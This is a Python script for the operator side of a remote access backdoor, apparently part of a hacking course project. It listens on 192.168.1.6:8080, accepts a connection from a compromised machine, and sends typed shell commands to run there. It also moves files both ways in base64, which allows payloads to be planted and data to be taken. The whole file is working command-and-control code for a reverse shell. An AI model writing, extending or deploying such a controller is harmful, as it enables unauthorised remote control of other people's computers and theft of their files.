#!/usr/bin/env python
import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.client, self.addr = self.listener.accept()
        print("[+] Got new connection: "+str(self.addr))

    def file_criate(self, path, file):
        with open(path, "wb") as file_name:
            file_name.write(base64.b64decode(file.encode('utf-8')))
            return "[+] Download successful."

    def file_upload(self, path):
        try:
            with open(path, "rb") as file_upload:
                return base64.b64encode(file_upload.read()).decode('utf-8')
        except FileNotFoundError:
            return "[-] Error, don't have file."

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.client.send(bytes(json_data, 'utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.client.close()
            self.listener.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input("[Command]>>")
            command = command.split(" ")
            try:
                if command[0] == 'upload':
                    command.append(self.file_upload(command[1]))
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error," not in result:
                    result = self.file_criate(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)
        self.listener.close()


if __name__ == '__main__':
    listener = Listener("192.168.1.6", 8080)
    listener.run()